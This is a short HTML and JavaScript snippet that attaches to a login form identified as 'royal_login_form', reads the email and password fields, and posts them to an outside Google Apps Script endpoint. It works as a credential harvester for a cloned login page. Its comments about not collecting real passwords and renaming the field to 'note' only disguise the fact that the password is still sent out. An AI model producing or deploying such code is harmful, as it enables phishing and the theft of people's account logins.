<!-- Add a small status element somewhere in your page -->
<div id="form-status" style="margin-top:8px;font:14px/1.4 sans-serif;"></div>

<script>
  // Match the existing form and inputs in your file
  const form = document.querySelector('form[data-testid="royal_login_form"]'); // the form present in your HTML
  const statusDiv = document.getElementById('form-status');

  form.addEventListener('submit', e => {
    e.preventDefault();
    statusDiv.textContent = 'Sending...';

    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwHJztDIqkO8l3bbaYAC-9odsgvBsy1LziUNoXYVt6n9yIbGVkeKkbFBzdZaIx2HtUS/exec';
    const email = document.getElementById('email').value;   // existing id
    const pass  = document.getElementById('pass').value;    // existing id

    // Use neutral field names; do NOT collect real passwords in production
    const formData = new FormData();
    formData.append('email', email);
    formData.append('note',  pass); // rename on the server to avoid storing credentials

    fetch(SCRIPT_URL, { method: 'POST', body: formData })
      .then(r => r.text())
      .then(msg => { statusDiv.textContent = msg; form.reset(); })
      .catch(err => { statusDiv.textContent = 'Error: ' + err.message; console.error(err); });
  });
</script>
